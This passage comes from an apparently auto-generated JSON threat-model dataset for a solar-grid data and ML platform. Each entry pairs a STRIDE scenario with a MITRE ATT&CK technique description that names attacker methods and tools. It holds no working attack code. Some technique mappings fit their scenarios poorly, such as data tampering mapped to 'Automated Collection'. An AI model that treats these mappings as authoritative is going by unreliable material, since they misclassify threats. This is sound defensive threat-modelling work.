                    "Assumption": "No use of VPN or other secure communication channels.",
                    "Role": "System Architect",
                    "Condition": "Reliance on unsecured communication methods"
                }
            ],
            "Potential Impact": "Data confidentiality is compromised.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "information disclosure",
                "encryption",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to metadata containing sensitive operational details.",
            "Assumptions": [
                {
                    "Assumption": "Weak access controls for metadata storage.",
                    "Role": "Security Administrator",
                    "Condition": "Lack of strict access control measures"
                },
                {
                    "Assumption": "The attacker has access to stolen or guessed credentials.",
                    "Role": "Attacker",
                    "Condition": "Credential compromise via phishing or brute force"
                },
                {
                    "Assumption": "No encryption of stored metadata.",
                    "Role": "Database Administrator",
                    "Condition": "Unencrypted data storage"
                }
            ],
            "Potential Impact": "Confidential information and operational details are exposed.",
            "MITRE ATT&CK Keywords": [
                "metadata",
                "information disclosure",
                "access control",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Cloud Instance Metadata API",
                "description": "Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.\n",
                "id": "attack-pattern--19bf235b-8620-4997-b5b4-94e0659ed7c3",
                "technique_id": "T1552.005"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An insider leaks proprietary AI/ML models.",
            "Assumptions": [
                {
                    "Assumption": "Insiders have access to AI/ML models without monitoring.",
                    "Role": "System Administrator",
                    "Condition": "Lack of access monitoring and logging"
                },
                {
                    "Assumption": "No encryption of AI/ML models stored on the platform.",
                    "Role": "Cloud Architect",
                    "Condition": "Unencrypted model storage"
                },
                {
                    "Assumption": "Weak data loss prevention (DLP) measures.",
                    "Role": "Security Officer",
                    "Condition": "Inadequate DLP policies and tools"
                }
            ],
            "Potential Impact": "Proprietary algorithms and trade secrets are disclosed.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "insider threat",
                "AI models",
                "data loss prevention"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker launches a DDoS attack against the TOREADOR platform, disrupting ML model training.",
            "Assumptions": [
                {
                    "Assumption": "TOREADOR platform has limited DDoS protection.",
                    "Role": "System Architect",
                    "Condition": "Inadequate DDoS mitigation strategies"
                },
                {
                    "Assumption": "The attacker has access to a botnet to generate traffic.",
                    "Role": "Attacker",
                    "Condition": "Control over a botnet or large number of compromised devices"
                },
                {
                    "Assumption": "Load balancing mechanisms are insufficient.",
                    "Role": "System Engineer",
                    "Condition": "Lack of robust load balancing"
                }
            ],
            "Potential Impact": "System availability and model training processes are disrupted.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "denial of service",
                "platform disruption",
                "botnet"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware infects the data logger, rendering it unable to forward data to the Receiver.",
            "Assumptions": [
                {
                    "Assumption": "Data logger lacks real-time malware protection.",
                    "Role": "System Administrator",
                    "Condition": "Absence of malware protection tools"
                },
                {
                    "Assumption": "The attacker manages to install malware via physical or network access.",
                    "Role": "Attacker",
                    "Condition": "Unauthorized access to the data logger"
                },
                {
                    "Assumption": "No redundancy in data logging and forwarding procedures.",
                    "Role": "System Architect",
                    "Condition": "Single point of failure in data logging"
                }
            ],
            "Potential Impact": "Data availability is compromised, impacting predictive maintenance and power optimization.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "malware",
                "data logger",
                "availability"
            ],
            "mitre_technique": {
                "name": "Disk Structure Wipe",
                "description": "Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. \n\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped.\n\nOn a network devices, adversaries may reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `format`.(Citation: format_cmd_cisco)\n\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)",
                "id": "attack-pattern--0af0ca99-357d-4ba1-805f-674fdfb7bef9",
                "technique_id": "T1561.002"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a zero-day vulnerability in the dashboard server, causing it to crash.",
            "Assumptions": [
                {
                    "Assumption": "Dashboard server software has unpatched vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "Unpatched server software"
                },
                {
                    "Assumption": "The attacker has knowledge of the zero-day vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Awareness of exploitable vulnerabilities"
                },
                {
                    "Assumption": "No effective intrusion detection systems in place.",
                    "Role": "Security Administrator",
                    "Condition": "Lack of intrusion detection and prevention"
                }
            ],
            "Potential Impact": "System availability is compromised, preventing users from accessing the dashboard.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "zero-day exploit",
                "server crash",
                "vulnerability"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a privilege escalation vulnerability on the TOREADOR platform to access and modify AI/ML models.",
            "Assumptions": [
                {
                    "Assumption": "TOREADOR platform has known or zero-day vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "Presence of unpatched or unknown vulnerabilities"
                },
                {
                    "Assumption": "The attacker has limited initial access.",
                    "Role": "Attacker",
                    "Condition": "Minimal access that can be leveraged for privilege escalation"
                },
                {
                    "Assumption": "Weak role-based access controls.",
                    "Role": "Security Architect",
                    "Condition": "Inadequate RBAC implementation"
                }
            ],
            "Potential Impact": "System integrity and confidentiality are compromised by unauthorized modifications to AI/ML models.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "privilege escalation",
                "AI models",
                "TOREADOR platform"
            ],
            "mitre_technique": {
                "name": "Windows Service",
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",
                "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
                "technique_id": "T1543.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An insider exploits insufficient access controls to gain administrative privileges on the LIGHT platform.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient separation of duties and access controls.",
                    "Role": "Security Officer",
                    "Condition": "Lack of strict access control policies"
                },
                {
                    "Assumption": "The insider has legitimate access to the platform.",
                    "Role": "Insider",
                    "Condition": "Authorized user with some level of access"
                },
                {
                    "Assumption": "No comprehensive monitoring of access rights.",
                    "Role": "System Administrator",
                    "Condition": "Absence of access rights monitoring tools"
                }
            ],
            "Potential Impact": "System integrity and security policies are compromised.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "insider threat",
                "administrative access",
                "access control"
            ],
            "mitre_technique": {
                "name": "Use Alternate Authentication Material",
                "description": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. \n\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)\n\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system\u2014either in memory or on disk\u2014it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.\n",
                "id": "attack-pattern--51a14c76-dd3b-440b-9c20-2bf91d25a814",
                "technique_id": "T1550"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A remote attacker uses a known malware tool to elevate privileges on the data logger device.",
            "Assumptions": [
                {
                    "Assumption": "Data logger has exploitable vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "Unpatched or insecure data logger software"
                },
                {
                    "Assumption": "The attacker has network access to the data logger.",
                    "Role": "Attacker",
                    "Condition": "Network presence or remote access capability"
                },
                {
                    "Assumption": "No endpoint detection and response (EDR) solution is in place.",
                    "Role": "Security Administrator",
                    "Condition": "Lack of EDR implementation"
                }
            ],
            "Potential Impact": "System control and data integrity are compromised by unauthorized privileged actions on the data logger.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "malware tool",
                "data logger",
                "remote access"
            ],
            "mitre_technique": {
                "name": "Remote Access Software",
                "description": "An adversary may use legitimate desktop support and remote access software to establish an interactive command and control channel to target systems within networks. These services, such as `VNC`, `Team Viewer`, `AnyDesk`, `ScreenConnect`, `LogMein`, `AmmyyAdmin`, and other remote monitoring and management (RMM) tools, are commonly used as legitimate technical support software and may be allowed by application control within a target environment.(Citation: Symantec Living off the Land)(Citation: CrowdStrike 2015 Global Threat Report)(Citation: CrySyS Blog TeamSpy)\n\nRemote access software may be installed and used post-compromise as an alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary-controlled system.\n \nAdversaries may similarly abuse response features included in EDR and other defensive tools that enable remote access.\n\nInstallation of many remote access software may also include persistence (e.g., the software's installation routine creates a [Windows Service](https://attack.mitre.org/techniques/T1543/003)). Remote access modules/features may also exist as part of otherwise existing software (e.g., Google Chrome\u2019s Remote Desktop).(Citation: Google Chrome Remote Desktop)(Citation: Chrome Remote Desktop)",
                "id": "attack-pattern--4061e78c-1284-44b4-9116-73e4ac3912f7",
                "technique_id": "T1219"
            }
        }
    ]
},
{
    "case_number": "9",
    "batch_number": "30",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs the identity of a legitimate sensor to feed false data to the Data Logger.",
            "Assumptions": [
                {
                    "Assumption": "The system incorrectly assumes sensor data is authenticated.",
                    "Role": "System design",
                    "Condition": "Existence of insufficient sensor authentication mechanisms."
                },
                {
                    "Assumption": "The attacker has network access to communicate with the Data Logger.",
                    "Role": "Attacker",
                    "Condition": "Vulnerable network boundaries or compromised network."
                },
                {
                    "Assumption": "The Data Logger trusts incoming data without validation.",
                    "Role": "Data Logger",
                    "Condition": "Lack of additional data validation inside the logger."
                }
            ],
            "Potential Impact": "Unauthorized disclosure or tampering of operational data, risking decision accuracy.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "sensor",
                "network",
                "identity"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses stolen credentials to access the Dashboard and gain insights into solar grid operations.",
            "Assumptions": [
                {
                    "Assumption": "User credentials are not adequately protected or are compromised.",
                    "Role": "User",
                    "Condition": "Use of weak passwords or lack of multi-factor authentication."
                },
                {
                    "Assumption": "The system assumes logged-in users are legitimate.",
                    "Role": "System design",
                    "Condition": "Lack of anomaly detection on user behavior."
                },
                {
                    "Assumption": "The attacker can gain access to sensitive operational data via the Dashboard.",
                    "Role": "Attacker",
                    "Condition": "Adequate access control is not enforced."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of operational data and potential system manipulation.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credentials",
                "dashboard",
                "user behavior"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker provides false metadata to the Anonymity Agent, impacting data pre-processing and model training.",
            "Assumptions": [
                {
                    "Assumption": "The system trusts metadata inputs without validation.",
                    "Role": "System design",
                    "Condition": "Missing validation of metadata integrity."
                },
                {
                    "Assumption": "The attacker has access to points where metadata is inputted.",
                    "Role": "Attacker",
                    "Condition": "Compromised interface or lack of access controls."
                },
                {
                    "Assumption": "The AI/ML models depend on unvalidated metadata for training.",
                    "Role": "AI/ML system",
                    "Condition": "Dependency on external, potentially tainted metadata."
                }
            ],
            "Potential Impact": "Corrupted training data, leading to inaccurate predictions and model failure.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "metadata",
                "model training",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Masquerading",
                "description": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\n\nRenaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)",
                "id": "attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0",
                "technique_id": "T1036"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters data during transmission from the Data Logger to the Receiver.",
            "Assumptions": [
                {
                    "Assumption": "The data in transit is not encrypted.",
                    "Role": "System design",
                    "Condition": "Lack of encryption for data transmission."
                },
                {
                    "Assumption": "The attacker can intercept and modify data packets.",
                    "Role": "Attacker",
                    "Condition": "Access to network channels used by the system."
                },
                {
                    "Assumption": "The Receiver trusts incoming data without verification.",
                    "Role": "Receiver",
                    "Condition": "Lack of data integrity checks."
                }
            ],
            "Potential Impact": "Compromised data integrity, leading to erroneous operational decisions.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data transmission",
                "network",
                "interception"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the AI/ML model parameters within the TOREADOR platform to undermine predictions.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the cloud-based environment.",
                    "Role": "Attacker",
                    "Condition": "Compromised cloud credentials or access permissions."
                },
                {
                    "Assumption": "Model parameters are not adequately secured.",
                    "Role": "System design",
                    "Condition": "Lack of proper access controls on model configurations."
                },
                {
                    "Assumption": "Changes to the model are not logged or audited.",
                    "Role": "System design",
                    "Condition": "Absence of audit trails or monitoring of model changes."
                }
            ],
            "Potential Impact": "Manipulated predictions, resulting in operational inefficiencies and potential hardware failures.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "cloud",
                "model parameters",
                "configuration"
            ],
            "mitre_technique": {
                "name": "Modify Cloud Compute Infrastructure",
                "description": "An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.\n\nPermissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.(Citation: Mandiant M-Trends 2020)",
                "id": "attack-pattern--144e007b-e638-431d-a894-45d90c54ab90",
                "technique_id": "T1578"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters the data stored in the TOREADOR platform affecting model training and validation.",
            "Assumptions": [
                {
                    "Assumption": "Stored data in the cloud is not encrypted and lacks integrity checks.",
                    "Role": "System design",
                    "Condition": "Lack of data encryption and integrity verification methods."
                },
                {
                    "Assumption": "The attacker has write access to the storage.",
                    "Role": "Attacker",
                    "Condition": "Compromised cloud storage credentials or permissions."
                },
                {
                    "Assumption": "Changes to stored data go undetected.",
                    "Role": "System design",
                    "Condition": "Insufficient monitoring and alerting mechanisms on data changes."
                }
            ],
            "Potential Impact": "Faulty model training, leading to inaccurate predictions and system anomalies.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "cloud storage",
                "data integrity",
                "model training"
            ],
            "mitre_technique": {
                "name": "Automated Collection",
                "description": "Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. \n\nIn cloud-based environments, adversaries may also use cloud APIs, data pipelines, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data.(Citation: Mandiant UNC3944 SMS Phishing 2023) \n\nThis functionality could also be built into remote access tools. \n\nThis technique may incorporate use of other techniques such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) and [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570) to identify and move files, as well as [Cloud Service Dashboard](https://attack.mitre.org/techniques/T1538) and [Cloud Storage Object Discovery](https://attack.mitre.org/techniques/T1619) to identify resources in cloud environments.",
                "id": "attack-pattern--30208d3e-0d6b-43c8-883e-44462a514619",
                "technique_id": "T1119"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An authorized user performs malicious activities through the Dashboard and denies responsibility.",
            "Assumptions": [
                {
                    "Assumption": "The system does not implement proper logging and user activity monitoring.",
                    "Role": "System design",
                    "Condition": "Absence of robust logging mechanisms."
                },
                {
                    "Assumption": "User actions are not traceable to individual authors.",
                    "Role": "System design",
                    "Condition": "Lack of link between actions and user identities."
                },
                {
                    "Assumption": "Attackers can perform actions that are indistinguishable from legitimate users.",
                    "Role": "Attacker",
                    "Condition": "Access to legitimate user credentials or via session hijacking."
                }
            ],
            "Potential Impact": "Difficulty in assigning blame, leading to unresolved security breaches and policy violations.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "user activity",
                "logging",
                "responsibility"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
